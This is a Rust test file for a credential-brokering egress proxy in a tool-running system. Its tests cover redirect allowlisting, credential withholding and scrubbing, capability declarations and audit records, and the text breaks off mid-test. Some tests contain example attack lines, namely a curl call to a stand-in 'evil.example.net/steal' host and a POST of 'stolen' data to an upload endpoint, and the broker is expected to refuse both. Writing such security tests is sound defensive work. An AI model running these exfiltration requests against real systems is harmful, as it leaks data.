//! Brokered egress: a tool reaches the network without ever holding a
//! credential, and only within the scope its host granted it.
//!
//! The rule is the same one `codeexec_tests.rs` pins for code: a Tool
//! Definition declaring "I may reach X with credential Y" would be a
//! permission arriving in the same bundle as the code it authorizes. So the
//! tool names which credential it wants at call time, and the HOST decides
//! whether it may have it.

use areev_run::{ExecResult, HostToolExecutor};
use serde_json::json;
use std::sync::Arc;

// ---- a loopback upstream, for the redirect tests ---------------------------

/// A one-thread HTTP/1.1 server that answers from a fixed routing table.
///
/// The redirect tests need a real upstream: the whole question is what the
/// broker does with a `Location` header, and no amount of unit-testing the URL
/// helpers answers whether a second request actually goes out. Each entry maps
/// a request path to `(status, extra headers, body)`; every request is also
/// recorded so a test can assert on what the upstream *saw* — which is how
/// "the credential did not travel" is checked at the only place it can be.
/// `(method, path, authorization)` — what one request looked like.
type SeenRequest = (String, String, Option<String>);
/// `(path, status, extra headers, body)` — one row of the routing table.
type Route = (&'static str, u16, Vec<(String, String)>, &'static str);

struct Upstream {
    port: u16,
    seen: Arc<std::sync::Mutex<Vec<SeenRequest>>>,
    stop: Arc<std::sync::atomic::AtomicBool>,
}

impl Upstream {
    fn start(routes: Vec<Route>) -> Upstream {
        use std::io::{BufRead, BufReader, Write};
        let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
        let port = listener.local_addr().unwrap().port();
        listener.set_nonblocking(true).unwrap();
        let seen = Arc::new(std::sync::Mutex::new(Vec::new()));
        let stop = Arc::new(std::sync::atomic::AtomicBool::new(false));
        let (seen_t, stop_t) = (Arc::clone(&seen), Arc::clone(&stop));

        std::thread::spawn(move || {
            while !stop_t.load(std::sync::atomic::Ordering::Relaxed) {
                let Ok((stream, _)) = listener.accept() else {
                    std::thread::sleep(std::time::Duration::from_millis(2));
                    continue;
                };
                stream.set_nonblocking(false).ok();
                let mut reader = BufReader::new(stream.try_clone().unwrap());
                let mut line = String::new();
                if reader.read_line(&mut line).is_err() {
                    continue;
                }
                let mut parts = line.split_whitespace();
                let method = parts.next().unwrap_or("").to_string();
                let path = parts.next().unwrap_or("/").to_string();
                let mut auth = None;
                let mut content_length = 0usize;
                loop {
                    let mut h = String::new();
                    if reader.read_line(&mut h).unwrap_or(0) == 0 || h.trim().is_empty() {
                        break;
                    }
                    let lower = h.to_ascii_lowercase();
                    if let Some(v) = lower.strip_prefix("authorization:") {
                        auth = Some(v.trim().to_string());
                    }
                    if let Some(v) = lower.strip_prefix("content-length:") {
                        content_length = v.trim().parse().unwrap_or(0);
                    }
                }
                if content_length > 0 {
                    let mut discard = vec![0u8; content_length];
                    use std::io::Read;
                    let _ = reader.read_exact(&mut discard);
                }
                seen_t.lock().unwrap().push((method, path.clone(), auth));

                let route = routes.iter().find(|(p, ..)| *p == path);
                let (status, headers, body) = match route {
                    Some((_, s, h, b)) => (*s, h.clone(), *b),
                    None => (404, Vec::new(), "not found"),
                };
                let mut head = format!("HTTP/1.1 {status} \r\nContent-Length: {}\r\n", body.len());
                for (k, v) in &headers {
                    head.push_str(&format!("{k}: {v}\r\n"));
                }
                head.push_str("Connection: close\r\n\r\n");
                let mut stream = stream;
                let _ = stream.write_all(head.as_bytes());
                let _ = stream.write_all(body.as_bytes());
                let _ = stream.flush();
            }
        });
        Upstream { port, seen, stop }
    }

    fn origin(&self) -> String {
        format!("http://127.0.0.1:{}", self.port)
    }

    /// `(method, path, authorization)` for every request this server handled.
    fn requests(&self) -> Vec<SeenRequest> {
        self.seen.lock().unwrap().clone()
    }
}

impl Drop for Upstream {
    fn drop(&mut self) {
        self.stop.store(true, std::sync::atomic::Ordering::Relaxed);
    }
}

fn header(k: &str, v: &str) -> Vec<(String, String)> {
    vec![(k.to_string(), v.to_string())]
}

/// POST an egress request to `broker` as `token`, returning `(http status, body)`.
fn ask(broker_url: &str, token: &str, req: serde_json::Value) -> (u16, serde_json::Value) {
    use std::io::{BufRead, BufReader, Read, Write};
    let addr = broker_url.trim_start_matches("http://");
    let mut s = std::net::TcpStream::connect(addr).unwrap();
    let body = req.to_string();
    let head = format!(
        "POST / HTTP/1.1\r\nHost: {addr}\r\nX-Areev-Egress-Token: {token}\r\n\
         Content-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n",
        body.len()
    );
    s.write_all(head.as_bytes()).unwrap();
    s.write_all(body.as_bytes()).unwrap();
    s.flush().unwrap();

    let mut reader = BufReader::new(s);
    let mut line = String::new();
    reader.read_line(&mut line).unwrap();
    let status: u16 = line.split_whitespace().nth(1).unwrap_or("0").parse().unwrap_or(0);
    let mut len = 0usize;
    loop {
        let mut h = String::new();
        if reader.read_line(&mut h).unwrap_or(0) == 0 || h.trim().is_empty() {
            break;
        }
        if let Some(v) = h.to_ascii_lowercase().strip_prefix("content-length:") {
            len = v.trim().parse().unwrap_or(0);
        }
    }
    let mut buf = vec![0u8; len];
    reader.read_exact(&mut buf).unwrap();
    (status, serde_json::from_slice(&buf).unwrap_or(json!(null)))
}

// ---- brokered egress -------------------------------------------------------

/// A tool must never see a credential value — only the broker's address and a
/// capability token. This asserts on the child's actual environment.
#[cfg(unix)]
#[test]
fn a_tool_receives_a_broker_address_and_a_token_but_never_the_secret() {
    use areev_run::{Broker, CallerGrant, CommandExecutor, EgressGrants, EgressHandle, EgressPolicy};

    std::env::set_var("AREEV_TEST_ZOHO", "super-secret-value");
    let broker = Broker::start(
        EgressPolicy::unrestricted(),
        [("zoho".to_string(), areev_run::Credential::bearer_from_env("AREEV_TEST_ZOHO").unwrap())]
            .into_iter()
            .collect(),
        EgressGrants::new()
            .grant("poster", CallerGrant::new().credential("zoho").method("POST"))
            .grant("reader", CallerGrant::new()),
        "RUN-E022",
    )
    .unwrap();
    std::env::remove_var("AREEV_TEST_ZOHO");
    let broker = Arc::new(broker);

    // Echo the egress environment back as the tool result.
    let exec = CommandExecutor::new(
        "printf '{\"url\":\"%s\",\"token\":\"%s\",\"leak\":\"%s\"}' \
         \"$AREEV_EGRESS_URL\" \"$AREEV_EGRESS_TOKEN\" \"$AREEV_TEST_ZOHO\"",
    )
    .with_egress(EgressHandle::new(Arc::clone(&broker)));

    let seen = match exec.execute("poster", "h", &json!({}), "k") {
        ExecResult::Ok(v) => v,
        ExecResult::Err { detail, .. } => panic!("tool failed: {detail}"),
    };
    assert_eq!(seen["url"], json!(broker.url()), "the tool gets the broker's address");
    assert_eq!(
        seen["token"],
        json!(broker.token_for("poster").unwrap()),
        "and its own capability token"
    );
    assert_eq!(seen["leak"], json!(""), "the credential value must never reach the child");

    // Two tools, one broker: the tokens differ, so the broker can tell them
    // apart and scope them differently.
    assert_ne!(broker.token_for("poster").unwrap(), broker.token_for("reader").unwrap());
}

/// A tool nobody granted anything cannot even see the broker.
#[cfg(unix)]
#[test]
fn an_ungranted_tool_is_handed_no_egress_at_all() {
    use areev_run::{Broker, CallerGrant, CommandExecutor, EgressGrants, EgressHandle, EgressPolicy};

    let broker = Arc::new(
        Broker::start(
            EgressPolicy::unrestricted(),
            Default::default(),
            EgressGrants::new().grant("poster", CallerGrant::new()),
            "RUN-E022",
        )
        .unwrap(),
    );
    let exec = CommandExecutor::new("printf '{\"url\":\"%s\"}' \"$AREEV_EGRESS_URL\"")
        .with_egress(EgressHandle::new(broker));

    let seen = match exec.execute("stranger", "h", &json!({}), "k") {
        ExecResult::Ok(v) => v,
        ExecResult::Err { detail, .. } => panic!("tool failed: {detail}"),
    };
    assert_eq!(seen["url"], json!(""), "an ungranted tool must not receive the broker's address");
}

// ---- the audit record ------------------------------------------------------

/// A refusal has to survive the terminal scrolling. This drives a real run
/// whose tool reaches for a blocked host, then reads the answer back out of
/// the memory — which is the question a reviewer actually asks ("did it ever
/// try?").
#[cfg(unix)]
#[test]
fn a_refused_destination_is_auditable_from_the_memory() {
    use areev_cal::AreevFacade;
    use areev_core::types::{Grain, Tool, ToolKind, Workflow};
    use areev_run::{
        Broker, CallerGrant, CommandExecutor, EgressGrants, EgressHandle, EgressPolicy, RunOptions,
        Runner, ScriptedClock,
    };
    use areev_store::Areev;
    use tempfile::TempDir;

    let dir = TempDir::new().unwrap();
    let m = Areev::open(dir.path().join("m.db").to_str().unwrap()).unwrap();
    let facade = Arc::new(AreevFacade::new(m));

    let def = Tool::new("reach")
        .kind(ToolKind::Definition)
        .tool_description("calls out")
        .created_at(500)
        .namespace("ops");
    let dh = facade.with_store(|m| m.add(&def)).unwrap();
    let plan = facade
        .with_store(|m| {
            m.add(
                &Workflow::new(vec!["reach".into()])
                    .bind("reach", &dh.to_hex())
                    .created_at(600)
                    .namespace("ops"),
            )
        })
        .unwrap();

    // Only example.com is allowed; the tool aims elsewhere.
    let broker = Arc::new(
        Broker::start(
            EgressPolicy::from_config(Some(&json!({
                "int:allowed_outbound_hosts": ["https://example.com"]
            })))
            .unwrap(),
            Default::default(),
            EgressGrants::new().grant("reach", CallerGrant::new().method("GET")),
            "RUN-E022",
        )
        .unwrap(),
    );

    // Ask the broker for a blocked host, twice, then answer anyway. The two
    // attempts must produce ONE audit fact.
    let exec = CommandExecutor::new(
        "for i in 1 2; do \
           curl -s -X POST -H \"X-Areev-Egress-Token: $AREEV_EGRESS_TOKEN\" \
             -d '{\"url\":\"https://evil.example.net/steal\",\"method\":\"GET\"}' \
             \"$AREEV_EGRESS_URL\" >/dev/null; \
         done; echo '{\"done\":true}'",
    )
    .with_egress(EgressHandle::new(Arc::clone(&broker)));

    let runner = Runner {
        facade: Arc::clone(&facade),
        clock: Arc::new(ScriptedClock::new(
            (0..200).map(|i| 1_755_000_000_000 + i * 10).collect(),
        )),
        executor: Arc::new(exec),
        llm: None,
        observer: None,
        ns: "ops".into(),
        principal: "user:runner".into(),
    };
    runner
        .start(
            &plan,
            "r1",
            json!({}),
            &RunOptions {
                budgets: Default::default(),
                ask_ttl_sec: None,
                workers: 1,
                on_dangling: areev_run::OnDangling::Redispatch,
                llm_max_tokens: None,
                inject_crash: None,
            },
        )
        .unwrap();

    // The refusal is in the memory, not only in a log line.
    let obs = facade
        .with_store(|m| {
            m.recent_live_scoped(
                &[areev_core::authz::HARNESS_NS.to_string()],
                Some(areev_core::types::GrainType::Observation),
                50,
            )
        })
        .unwrap();
    let refusals: Vec<_> = obs
        .iter()
        .filter(|g| g.get_str("observation_kind") == Some("egress_refusal"))
        .collect();

    assert_eq!(refusals.len(), 1, "two attempts, one audit fact: {refusals:?}");
    let r = refusals[0];
    assert_eq!(r.get_str("run_id"), Some("r1"));
    assert_eq!(r.get_str("caller"), Some("reach"), "the record names who tried");
    assert_eq!(r.get_str("destination"), Some("https://evil.example.net/steal"));
    assert!(
        r.get_str("reason").unwrap_or_default().contains("allowlist"),
        "and why it was refused: {r:?}"
    );
}

// ---- #99: the allowlist governs every hop, not just the first --------------

use areev_run::{Broker, CallerGrant, Credential, EgressGrants, EgressPolicy};

fn policy_for(origins: &[String]) -> EgressPolicy {
    EgressPolicy::from_config(Some(&json!({ "int:allowed_outbound_hosts": origins }))).unwrap()
}

/// The bug, stated as a test: an ALLOWED host answers `302` pointing at a host
/// nobody allowed, and the broker must not fetch it.
///
/// Before the fix ureq followed the hop itself (default `max_redirects: 10`)
/// and handed the unlisted host's body straight back to the tool — the
/// allowlist constrained where a request *started*, never where it ended up.
/// The second server here stands in for the cloud metadata service: if it ever
/// records a request, the control has been walked through.
#[test]
fn a_redirect_to_an_unlisted_host_is_refused_and_never_fetched() {
    let secret_site = Upstream::start(vec![("/loot", 200, Vec::new(), "TOP SECRET")]);
    let allowed = Upstream::start(vec![(
        "/go",
        302,
        header("Location", &format!("{}/loot", secret_site.origin())),
        "",
    )]);

    // Only the first origin is on the allowlist.
    let broker = Broker::start(
        policy_for(&[allowed.origin()]),
        Default::default(),
        EgressGrants::new().grant("t", CallerGrant::new()),
        "RUN-E022",
    )
    .unwrap();
    let token = broker.token_for("t").unwrap().to_string();

    let (code, body) = ask(
        broker.url(),
        &token,
        json!({ "url": format!("{}/go", allowed.origin()), "method": "GET" }),
    );

    assert_eq!(code, 403, "the redirect must be refused: {body}");
    assert_eq!(body["code"], json!("RUN-E022"), "and carry the domain's refusal code");
    assert!(
        secret_site.requests().is_empty(),
        "no byte may reach an unlisted host: {:?}",
        secret_site.requests()
    );

    // And it is audit evidence, not just an error the tool swallowed.
    let refusals = broker.refusals();
    assert_eq!(refusals.len(), 1, "{refusals:?}");
    assert!(
        refusals[0].reason.contains("redirect target"),
        "a redirect refusal reads differently from an aimed-at one: {:?}",
        refusals[0].reason
    );
    assert!(refusals[0].destination.contains(&format!("{}", secret_site.port)));
}

/// The mirror image, which was a silent functional breakage: a legitimate
/// same-origin `30x` used to arrive unauthenticated because ureq's
/// `redirect_auth_headers` is `Never`, so the API 401'd and nothing said why.
#[test]
fn a_same_origin_redirect_keeps_the_credential() {
    let site = Upstream::start(vec![
        ("/start", 302, header("Location", "/final"), ""),
        ("/final", 200, Vec::new(), "{\"ok\":true}"),
    ]);

    std::env::set_var("AREEV_TEST_REDIR_CRED", "s3cr3t");
    let broker = Broker::start(
        policy_for(&[site.origin()]),
        [("api".to_string(), Credential::bearer_from_env("AREEV_TEST_REDIR_CRED").unwrap())]
            .into_iter()
            .collect(),
        EgressGrants::new().grant("t", CallerGrant::new().credential("api")),
        "RUN-E022",
    )
    .unwrap();
    std::env::remove_var("AREEV_TEST_REDIR_CRED");
    let token = broker.token_for("t").unwrap().to_string();

    let (code, body) = ask(
        broker.url(),
        &token,
        json!({ "url": format!("{}/start", site.origin()), "method": "GET", "credential": "api" }),
    );
    assert_eq!(code, 200, "{body}");
    assert_eq!(body["status"], json!(200), "the broker followed through to the final response");

    let reqs = site.requests();
    assert_eq!(reqs.len(), 2, "both hops happened: {reqs:?}");
    assert_eq!(reqs[1].1, "/final", "and the relative Location resolved against the base");
    assert_eq!(
        reqs[1].2.as_deref(),
        Some("bearer s3cr3t"),
        "the credential survives a same-origin redirect: {reqs:?}"
    );
}

/// Same origin is where the credential stops. Both hosts are allowlisted here,
/// so the request is legitimate — but the second one is not the origin the
/// caller named, and the secret does not travel to it.
#[test]
fn a_cross_origin_redirect_is_followed_without_the_credential() {
    let other = Upstream::start(vec![("/there", 200, Vec::new(), "landed")]);
    let first = Upstream::start(vec![(
        "/here",
        302,
        header("Location", &format!("{}/there", other.origin())),
        "",
    )]);

    std::env::set_var("AREEV_TEST_XORIGIN_CRED", "do-not-forward");
    let broker = Broker::start(
        policy_for(&[first.origin(), other.origin()]),
        [("api".to_string(), Credential::bearer_from_env("AREEV_TEST_XORIGIN_CRED").unwrap())]
            .into_iter()
            .collect(),
        EgressGrants::new().grant("t", CallerGrant::new().credential("api")),
        "RUN-E022",
    )
    .unwrap();
    std::env::remove_var("AREEV_TEST_XORIGIN_CRED");
    let token = broker.token_for("t").unwrap().to_string();

    let (code, body) = ask(
        broker.url(),
        &token,
        json!({ "url": format!("{}/here", first.origin()), "method": "GET", "credential": "api" }),
    );
    assert_eq!(code, 200, "{body}");
    assert_eq!(body["body"], json!("landed"), "an allowlisted second hop is still followed");

    let reqs = other.requests();
    assert_eq!(reqs.len(), 1);
    assert_eq!(reqs[0].2, None, "a different origin gets no credential: {reqs:?}");
}

/// A grant is checked against the method actually issued. A caller permitted
/// only to POST must not be walked into a GET by a 303 — nor a read-only
/// caller into a write.
#[test]
fn a_redirect_that_changes_the_method_is_re_checked_against_the_grant() {
    let site = Upstream::start(vec![
        ("/submit", 303, header("Location", "/result"), ""),
        ("/result", 200, Vec::new(), "done"),
    ]);
    let broker = Broker::start(
        policy_for(&[site.origin()]),
        Default::default(),
        // POST only: the 303's GET is NOT covered, because a grant that names
        // methods names all of them.
        EgressGrants::new().grant("t", CallerGrant::new().method("POST")),
        "RUN-E022",
    )
    .unwrap();
    let token = broker.token_for("t").unwrap().to_string();

    let (code, body) = ask(
        broker.url(),
        &token,
        json!({ "url": format!("{}/submit", site.origin()), "method": "POST", "body": "x" }),
    );
    assert_eq!(code, 403, "{body}");
    let reqs = site.requests();
    assert_eq!(reqs.len(), 1, "the follow-up was never issued: {reqs:?}");
    assert!(broker.refusals()[0].reason.contains("redirect would issue GET"));
}

/// Bounded, and the bound is auditable rather than a hang.
#[test]
fn an_endless_redirect_loop_is_abandoned_and_recorded() {
    let site = Upstream::start(vec![("/loop", 302, header("Location", "/loop"), "")]);
    let broker = Broker::start(
        policy_for(&[site.origin()]),
        Default::default(),
        EgressGrants::new().grant("t", CallerGrant::new()),
        "RUN-E022",
    )
    .unwrap();
    let token = broker.token_for("t").unwrap().to_string();

    let (code, body) =
        ask(broker.url(), &token, json!({ "url": format!("{}/loop", site.origin()), "method": "GET" }));
    assert_eq!(code, 403, "{body}");
    assert!(broker.refusals()[0].reason.contains("hops"), "{:?}", broker.refusals());
    assert!(site.requests().len() <= 11, "bounded: {}", site.requests().len());
}

/// A non-2xx is the upstream's answer, not a broker failure. Before #99 every
/// 4xx/5xx collapsed into `502 {"error": "upstream: …"}`, so a rate-limit and a
/// dead socket were indistinguishable to the tool.
#[test]
fn a_non_2xx_reaches_the_caller_as_a_status_not_a_broker_error() {
    let site = Upstream::start(vec![("/nope", 429, Vec::new(), "slow down")]);
    let broker = Broker::start(
        policy_for(&[site.origin()]),
        Default::default(),
        EgressGrants::new().grant("t", CallerGrant::new()),
        "RUN-E022",
    )
    .unwrap();
    let token = broker.token_for("t").unwrap().to_string();

    let (code, body) =
        ask(broker.url(), &token, json!({ "url": format!("{}/nope", site.origin()), "method": "GET" }));
    assert_eq!(code, 200);
    assert_eq!(body["status"], json!(429));
    assert_eq!(body["body"], json!("slow down"));
}

// ---- #100: the credential variable is withheld from children ---------------

/// Reading a credential from a named variable is what registers that variable
/// as a secret.
///
/// The pre-existing test above asserts the child sees no credential, but it
/// `remove_var`s the variable from the PARENT before spawning — so it pinned
/// the broker's request path, not the deployment where an operator exports
/// `ZOHO_TOKEN` and leaves it exported. Under that (normal) condition the child
/// inherited the raw secret and never needed the broker at all. This asserts
/// the real shape: the variable stays exported, and the child still cannot see
/// it.
#[cfg(unix)]
#[test]
fn the_credential_variable_is_withheld_from_children_while_still_exported() {
    use areev_run::{CommandExecutor, EgressHandle};

    std::env::set_var("AREEV_TEST_STILL_EXPORTED", "raw-secret-value");
    let cred = Credential::bearer_from_env("AREEV_TEST_STILL_EXPORTED").unwrap();
    assert!(matches!(cred, Credential::Bearer(ref v) if v == "raw-secret-value"));

    // Reading it registered it — that is the fix, and it is what makes every
    // host (run, trigger, Python, Node) safe rather than only the one that
    // remembered to call `deny_env_var`.
    assert!(
        areev_core::proc::secret_env_vars().iter().any(|v| v == "AREEV_TEST_STILL_EXPORTED"),
        "reading a credential must register its variable as a secret"
    );

    let broker = Arc::new(
        Broker::start(
            EgressPolicy::unrestricted(),
            [("api".to_string(), cred)].into_iter().collect(),
            EgressGrants::new().grant("t", CallerGrant::new().credential("api")),
            "RUN-E022",
        )
        .unwrap(),
    );
    // NOTE: deliberately still exported in this process.
    assert_eq!(std::env::var("AREEV_TEST_STILL_EXPORTED").unwrap(), "raw-secret-value");

    let exec = CommandExecutor::new(
        "printf '{\"leak\":\"%s\",\"token\":\"%s\"}' \
         \"$AREEV_TEST_STILL_EXPORTED\" \"$AREEV_EGRESS_TOKEN\"",
    )
    .with_egress(EgressHandle::new(Arc::clone(&broker)));

    let seen = match exec.execute("t", "h", &json!({}), "k") {
        ExecResult::Ok(v) => v,
        ExecResult::Err { detail, .. } => panic!("tool failed: {detail}"),
    };
    std::env::remove_var("AREEV_TEST_STILL_EXPORTED");

    assert_eq!(
        seen["leak"],
        json!(""),
        "the raw credential must not be inherited by the child even while exported"
    );
    assert_eq!(
        seen["token"],
        json!(broker.token_for("t").unwrap()),
        "and the broker token still reaches it — the extras are applied after the policy"
    );
}

// ---- #101: declared ∩ host-granted ----------------------------------------

use areev_run::{CapabilityLimits, Declaration};

fn declaration(v: serde_json::Value) -> Declaration {
    Declaration::parse(&v).unwrap()
}

/// The intersection, in the direction that matters: a broad host grant plus a
/// narrow declaration gives the narrow one.
///
/// The host allowlists a whole API and grants POST. The module declares one
/// path prefix on it. The exfiltration case a host-only grant structurally
/// cannot express — a malicious tool POSTing stolen context to an *allowed*
/// host's upload endpoint — is what the declaration closes.
#[test]
fn a_declaration_narrows_a_broader_host_grant() {
    let site = Upstream::start(vec![
        ("/gmail/v1/users/me/messages/send", 200, Vec::new(), "sent"),
        ("/upload/drive/v3/files", 200, Vec::new(), "EXFILTRATED"),
    ]);
    let broker = Broker::start(
        policy_for(&[site.origin()]),
        Default::default(),
        // The host is generous: the whole origin, and POST.
        EgressGrants::new().grant("send_ask", CallerGrant::new().method("POST")),
        "RUN-E022",
    )
    .unwrap();
    // The module is not.
    broker.declare(
        "send_ask",
        declaration(json!([{"http": {
            "hosts": [site.origin()],
            "methods": ["POST"],
            "path_prefixes": ["/gmail/v1/users/me/"]
        }}])),
        CapabilityLimits::default(),
    );
    let token = broker.token_for("send_ask").unwrap().to_string();

    let (ok, _) = ask(
        broker.url(),
        &token,
        json!({ "url": format!("{}/gmail/v1/users/me/messages/send", site.origin()),
                "method": "POST", "body": "{}" }),
    );
    assert_eq!(ok, 200, "the declared path is reachable");

    let (denied, body) = ask(
        broker.url(),
        &token,
        json!({ "url": format!("{}/upload/drive/v3/files", site.origin()),
                "method": "POST", "body": "stolen" }),
    );
    assert_eq!(denied, 403, "an undeclared path on an ALLOWED host is refused: {body}");
    assert!(
        body["error"].as_str().unwrap_or_default().contains("path_prefixes"),
        "and the refusal names why: {body}"
    );
    let paths: Vec<String> = site.requests().into_iter().map(|(_, p, _)| p).collect();
    assert_eq!(paths, vec!["/gmail/v1/users/me/messages/send"], "the upload never went out");
}

/// And in the other direction: a declaration cannot grant what the host did
/// not. Declaring a credential is not being given one.
#[test]
fn a_declaration_cannot_widen_what_the_host_granted() {
    let site = Upstream::start(vec![("/x", 200, Vec::new(), "ok")]);
    std::env::set_var("AREEV_TEST_UNGRANTED", "never-attached");
    let broker = Broker::start(
        policy_for(&[site.origin()]),
        [("gmail".to_string(), Credential::bearer_from_env("AREEV_TEST_UNGRANTED").unwrap())]
            .into_iter()
            .collect(),
        // The host grants the tool NO credential and only reads.
        EgressGrants::new().grant("t", CallerGrant::new()),
        "RUN-E022",
    )
    .unwrap();
    std::env::remove_var("AREEV_TEST_UNGRANTED");
    // The declaration claims both. It is a ceiling, not a grant.
    broker.declare(
        "t",
        declaration(json!([{"http": {
            "hosts": [site.origin()], "methods": ["POST"], "credentials": ["gmail"]
        }}])),
        CapabilityLimits::default(),
    );
    let token = broker.token_for("t").unwrap().to_string();

    let (code, body) = ask(
        broker.url(),
        &token,
        json!({ "url": format!("{}/x", site.origin()), "method": "POST", "credential": "gmail" }),
    );
    assert_eq!(code, 403, "the host grant still binds: {body}");
    assert!(site.requests().is_empty(), "nothing went out");
}

/// Overruns are typed errors, never truncation — a tool handed half a response
/// computes a wrong answer with nothing to show for it.
#[test]
fn a_response_above_the_ceiling_is_refused_rather_than_truncated() {
    let site = Upstream::start(vec![("/big", 200, Vec::new(), "0123456789ABCDEF")]);
    let broker = Broker::start(
        policy_for(&[site.origin()]),
        Default::default(),
        EgressGrants::new().grant("t", CallerGrant::new()),
        "RUN-E022",
    )
    .unwrap();
    broker.declare(
        "t",
        declaration(json!([{"http": {"hosts": [site.origin()]}}])),
        CapabilityLimits { max_calls: 8, max_response_bytes: 4 },
    );
    let token = broker.token_for("t").unwrap().to_string();

    let (code, body) =
        ask(broker.url(), &token, json!({ "url": format!("{}/big", site.origin()), "method": "GET" }));
    assert_eq!(code, 403, "{body}");
    assert!(body["error"].as_str().unwrap_or_default().contains("rather than truncated"), "{body}");
}

/// The call budget bounds ATTEMPTS, not successes — otherwise a module could
/// probe the policy for free.
#[test]
fn a_capability_tool_cannot_exceed_its_call_ceiling() {
    let site = Upstream::start(vec![("/x", 200, Vec::new(), "ok")]);
    let broker = Broker::start(
        policy_for(&[site.origin()]),
        Default::default(),
        EgressGrants::new().grant("t", CallerGrant::new()),
        "RUN-E022",
    )
    .unwrap();
    broker.declare(
        "t",
        declaration(json!([{"http": {"hosts": [site.origin()]}}])),
        CapabilityLimits { max_calls: 2, max_response_bytes: 1024 },
    );
    let token = broker.token_for("t").unwrap().to_string();
    let req = json!({ "url": format!("{}/x", site.origin()), "method": "GET" });

    assert_eq!(ask(broker.url(), &token, req.clone()).0, 200);
    assert_eq!(ask(broker.url(), &token, req.clone()).0, 200);
    let (code, body) = ask(broker.url(), &token, req);
    assert_eq!(code, 403, "the third call is over the ceiling: {body}");
    assert_eq!(site.requests().len(), 2, "and it never went out");
    assert!(broker.refusals().iter().any(|r| r.reason.contains("ceiling of 2")));
}

/// Every mediated call is recorded — bodies as digests, the credential by name.
#[test]
fn a_successful_call_is_recorded_with_digests_and_never_a_body() {
    let site = Upstream::start(vec![("/x", 201, Vec::new(), "the response body")]);
    std::env::set_var("AREEV_TEST_RECORDED", "secret-value-here");
    let broker = Broker::start(
        policy_for(&[site.origin()]),
        [("api".to_string(), Credential::bearer_from_env("AREEV_TEST_RECORDED").unwrap())]
            .into_iter()
            .collect(),
        EgressGrants::new().grant("t", CallerGrant::new().credential("api").method("POST")),
        "RUN-E022",
    )
    .unwrap();
    std::env::remove_var("AREEV_TEST_RECORDED");
    let token = broker.token_for("t").unwrap().to_string();

    let (code, _) = ask(
        broker.url(),
        &token,
        json!({ "url": format!("{}/x", site.origin()), "method": "POST",
                "body": "the request body", "credential": "api" }),
    );
    assert_eq!(code, 200);

    let calls = broker.calls();
    assert_eq!(calls.len(), 1, "{calls:?}");
    let c = &calls[0];
    assert_eq!(c.caller, "t");
    assert_eq!(c.method, "POST");
    assert_eq!(c.status, 201, "the upstream's status, not the broker's");
    assert_eq!(c.credential.as_deref(), Some("api"), "the credential by NAME");
    assert!(c.request_digest.as_deref().unwrap().starts_with("sha256:"));
    assert!(c.response_digest.starts_with("sha256:"));
    assert_eq!(c.response_bytes, "the response body".len());
    // The record must not carry what was said, only which thing was said.
    let rendered = format!("{c:?}");
    assert!(!rendered.contains("the request body"), "bodies are digests: {rendered}");
    assert!(!rendered.contains("the response body"), "bodies are digests: {rendered}");
    assert!(!rendered.contains("secret-value-here"), "and never the credential: {rendered}");
}

/// Credential reflection: an echo endpoint bounces the injected header back in
/// its BODY, which would otherwise reach the guest and the audit trail.
#[test]
fn a_credential_reflected_in_a_response_body_is_scrubbed() {
    // The upstream echoes the Authorization value it was sent.
    let site = Upstream::start(vec![(
        "/echo",
        200,
        Vec::new(),
        r#"{"you_sent":"Bearer reflect-me-please"}"#,
    )]);
    std::env::set_var("AREEV_TEST_REFLECT", "reflect-me-please");
    let broker = Broker::start(
        policy_for(&[site.origin()]),
        [("api".to_string(), Credential::bearer_from_env("AREEV_TEST_REFLECT").unwrap())]
            .into_iter()
            .collect(),
        EgressGrants::new().grant("t", CallerGrant::new().credential("api")),
        "RUN-E022",
    )
    .unwrap();
    std::env::remove_var("AREEV_TEST_REFLECT");
    let token = broker.token_for("t").unwrap().to_string();

    let (code, body) = ask(
        broker.url(),
        &token,
        json!({ "url": format!("{}/echo", site.origin()), "method": "GET", "credential": "api" }),
    );
    assert_eq!(code, 200);
    let returned = body["body"].as_str().unwrap_or_default();
    assert!(
        !returned.contains("reflect-me-please"),
        "a reflected credential must not reach the caller: {returned}"
    );
    assert!(returned.contains("[redacted-credential]"), "{returned}");
}

/// A caller with NO declaration is unaffected — every `--tool-cmd` tool and
/// every connector keeps exactly the host-grant-only behaviour it had.
#[test]
fn a_caller_that_declares_nothing_is_governed_by_the_host_grant_alone() {
    let site = Upstream::start(vec![("/anything", 200, Vec::new(), "ok")]);
    let broker = Broker::start(
        policy_for(&[site.origin()]),
        Default::default(),
        EgressGrants::new().grant("plain", CallerGrant::new()),
        "RUN-E022",
    )
    .unwrap();
    let token = broker.token_for("plain").unwrap().to_string();
    let (code, body) = ask(
        broker.url(),
        &token,
        json!({ "url": format!("{}/anything", site.origin()), "method": "GET" }),
    );
    assert_eq!(code, 200, "no declaration means no extra gate: {body}");
    assert!(broker.refusals().is_empty());
}

/// The mirror of `a_refused_destination_is_auditable_from_the_memory`: a call
/// that SUCCEEDED has to survive the terminal scrolling too.
///
/// "It was allowed to reach Gmail" is a policy statement; "it sent these
/// requests" is the evidence, and only one of them was in the memory before
/// #101. Drives a real run and reads the answer back out.
#[cfg(unix)]
#[test]
fn a_successful_brokered_call_is_auditable_from_the_memory() {
    use areev_cal::AreevFacade;
    use areev_core::types::{Grain, Tool, ToolKind, Workflow};
    use areev_run::{CommandExecutor, EgressHandle, RunOptions, Runner, ScriptedClock};
    use areev_store::Areev;
    use tempfile::TempDir;

    let site = Upstream::start(vec![("/ok", 200, Vec::new(), "upstream said hi")]);
    let dir = TempDir::new().unwrap();
    let m = Areev::open(dir.path().join("m.db").to_str().unwrap()).unwrap();
    let facade = Arc::new(AreevFacade::new(m));

    let def = Tool::new("reach")
        .kind(ToolKind::Definition)
        .tool_description("calls out")
        .created_at(500)
        .namespace("ops");
    let dh = facade.with_store(|m| m.add(&def)).unwrap();
    let plan = facade
        .with_store(|m| {
            m.add(
                &Workflow::new(vec!["reach".into()])
                    .bind("reach", &dh.to_hex())
                    .created_at(600)
                    .namespace("ops"),
            )
        })
        .unwrap();

    let broker = Arc::new(
        Broker::start(
            policy_for(&[site.origin()]),
            Default::default(),
            EgressGrants::new().grant("reach", CallerGrant::new()),
            "RUN-E022",
        )
        .unwrap(),
    );

    // Two DISTINCT calls: successes are effects, so two of them are two facts —
    // unlike refusals, which dedupe.
    let exec = CommandExecutor::new(&format!(
        "curl -s -X POST -H \"X-Areev-Egress-Token: $AREEV_EGRESS_TOKEN\" \
